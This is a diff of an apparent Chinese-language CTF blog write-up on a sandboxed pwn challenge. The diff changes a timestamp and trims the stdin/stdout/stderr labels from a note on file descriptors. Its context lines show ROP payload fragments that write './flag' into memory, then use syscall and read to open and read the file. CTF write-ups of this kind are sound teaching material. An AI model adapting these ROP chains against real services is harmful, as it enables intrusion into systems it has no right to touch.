@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230306141247754.png">
 <meta property="og:image" content="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/image-20230307000430195.png">
 <meta property="article:published_time" content="2023-03-05T03:39:52.000Z">
-<meta property="article:modified_time" content="2023-03-29T16:49:36.294Z">
+<meta property="article:modified_time" content="2023-04-11T08:42:42.398Z">
 <meta property="article:author" content="Grxer">
 <meta property="article:tag" content="Stack Migration">
 <meta property="article:tag" content="Sandbox">
@@ -248,9 +248,9 @@
 <p>我们先把‘.&#x2F;flag’字符串通过read函数写入内存payload&#x3D;b’deadbeef’+p64(rdi)+p64(0)+p64(rsi_r15)+p64(0x404900)+p64(0x40)+p64(read_addr)+p64(main)</p>
 <blockquote>
 <p>三个文件描述符</p>
-<p>0 标准输入stdin</p>
-<p>1 标志输出 stdout</p>
-<p>2 标志错误 stderr</p>
+<p>0 标准输入</p>
+<p>1 标志输出 </p>
+<p>2 标志错误 </p>
 </blockquote>
 <p>在利用标准库里的syscall打开flag文件，read读取到内存</p>
 <p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(0x2)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘syscall’])<br>payload+&#x3D;p64(rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘read’])+p64(main)</p>
